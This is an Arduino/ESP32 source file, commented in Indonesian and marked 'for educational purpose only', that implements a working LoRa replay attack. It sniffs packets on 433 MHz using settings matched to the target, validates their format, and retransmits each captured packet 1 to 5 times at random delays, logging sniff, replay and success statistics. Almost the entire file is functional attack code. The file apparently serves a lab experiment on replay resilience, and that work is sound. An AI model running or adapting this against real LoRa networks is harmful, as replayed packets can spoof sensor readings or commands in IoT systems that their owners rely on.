/*
ATTACKER / SNIFFER + RANDOM REPLAY LoRa
--------------------------------
Author: Mohammad Rizki Fadillah

Description:
- Menyadap paket LoRa
- Replay otomatis setiap paket yang berhasil ditangkap
- Jumlah replay random (1-5x)
- Delay replay random
- Simulasi replay attack lebih realistis

FOR EDUCATIONAL PURPOSE ONLY
--------------------------------
*/

#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// =====================================
// PARAMETER
// =====================================
const uint32_t EXPECTED = 200;

const unsigned long TIMEOUT_MS = 30000;

// =====================================
// METRICS
// =====================================
uint32_t sniffedCount   = 0;
uint32_t decodedCount   = 0;
uint32_t invalidCount   = 0;
uint32_t replayedCount  = 0;

// =====================================
// UNIQUE TRACKER
// =====================================
bool seen[EXPECTED] = {false};

uint32_t uniqueCount    = 0;
uint32_t duplicateCount = 0;

// =====================================
// STATE
// =====================================
unsigned long lastRecvTime = 0;

bool started = false;
bool done    = false;

// =====================================
// VALIDASI PAYLOAD
// =====================================
bool isValidPayload(String data, uint32_t &id) {

  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  if (p1 == -1 || p2 == -1) {
    return false;
  }

  String idStr = data.substring(0, p1);

  // cek numeric
  for (int i = 0; i < idStr.length(); i++) {
    if (!isDigit(idStr[i])) {
      return false;
    }
  }

  id = idStr.toInt();

  return true;
}

// =====================================
// SUMMARY
// =====================================
void printSummary() {

  float sniffRate =
    (sniffedCount * 100.0) / EXPECTED;

  float decodeRate =
    (sniffedCount > 0)
    ? ((decodedCount * 100.0) / sniffedCount)
    : 0;

  float packetLoss =
    100.0 - sniffRate;

  Serial.println("\n========== ATTACK SUMMARY ==========");

  Serial.print("Sniffed Total     : ");
  Serial.println(sniffedCount);

  Serial.print("Decoded Valid     : ");
  Serial.println(decodedCount);

  Serial.print("Invalid Payload   : ");
  Serial.println(invalidCount);

  Serial.print("Unique Packet     : ");
  Serial.println(uniqueCount);

  Serial.print("Duplicate Packet  : ");
  Serial.println(duplicateCount);

  Serial.print("Replay Sent Total : ");
  Serial.println(replayedCount);

  Serial.print("Sniff Success (%) : ");
  Serial.println(sniffRate);

  Serial.print("Packet Loss (%)   : ");
  Serial.println(packetLoss);

  Serial.print("Decode Success(%) : ");
  Serial.println(decodeRate);

  Serial.println("====================================");
}

// =====================================
// SETUP
// =====================================
void setup() {

  Serial.begin(115200);

  // random seed
  randomSeed(analogRead(34));

  SPI.begin(18, 19, 23, SS);

  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433E6)) {

    Serial.println("LoRa init FAILED!");

    while (1);
  }

  // samain config target
  LoRa.setSpreadingFactor(7);

  LoRa.setSignalBandwidth(125E3);

  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println("====================================");
  Serial.println("ATTACKER READY");
  Serial.println("MODE : RANDOM REPLAY ATTACK");
  Serial.println("Replay : 1-5x Random");
  Serial.println("====================================\n");
}

// =====================================
// MAIN LOOP
// =====================================
void loop() {

  if (done) {
    return;
  }

  // =====================================
  // SNIFF PACKET
  // =====================================
  int packetSize = LoRa.parsePacket();

  if (packetSize) {

    started = true;

    lastRecvTime = millis();

    sniffedCount++;

    String data = "";

    while (LoRa.available()) {
      data += (char)LoRa.read();
    }

    // =====================================
    // VALIDASI
    // =====================================
    uint32_t id = 0;

    bool valid = isValidPayload(data, id);

    if (valid) {

      decodedCount++;

      if (id < EXPECTED) {

        if (!seen[id]) {

          seen[id] = true;

          uniqueCount++;

        } else {

          duplicateCount++;
        }
      }

    } else {

      invalidCount++;
    }

    // =====================================
    // LOG SNIFF
    // =====================================
    Serial.print("[SNIFF] ");

    Serial.print(data);

    Serial.print(" | RSSI=");

    Serial.print(LoRa.packetRssi());

    Serial.print(" | SNR=");

    Serial.print(LoRa.packetSnr());

    if (!valid) {
      Serial.print(" | INVALID");
    }

    Serial.println();

    // =====================================
    // RANDOM REPLAY ATTACK
    // =====================================
    if (valid && data != "") {

      // random replay 1-5x
      int replayTimes = random(1, 6);

      Serial.print("[ATTACK] Replay Count = ");

      Serial.println(replayTimes);

      for (int i = 0; i < replayTimes; i++) {

        // delay random
        // tetap aman < 8 detik total
        int randomDelay =
          random(300, 900);

        delay(randomDelay);

        replayedCount++;

        Serial.print("[REPLAY ");

        Serial.print(i + 1);

        Serial.print("/");

        Serial.print(replayTimes);

        Serial.print("] Delay=");

        Serial.print(randomDelay);

        Serial.print("ms | ");

        Serial.println(data);

        // =====================================
        // KIRIM ULANG PACKET
        // =====================================
        LoRa.beginPacket();

        LoRa.print(data);

        LoRa.endPacket();

        // balik lagi receive
        LoRa.receive();
      }
    }

    // =====================================
    // STOP KALO TARGET TERCAPAI
    // =====================================
    if (sniffedCount >= EXPECTED) {

      printSummary();

      done = true;
    }
  }

  // =====================================
  // TIMEOUT
  // =====================================
  if (
    started &&
    !done &&
    (millis() - lastRecvTime > TIMEOUT_MS)
  ) {

    Serial.println("\n[TIMEOUT] No new packet 30s");

    printSummary();

    done = true;
  }
}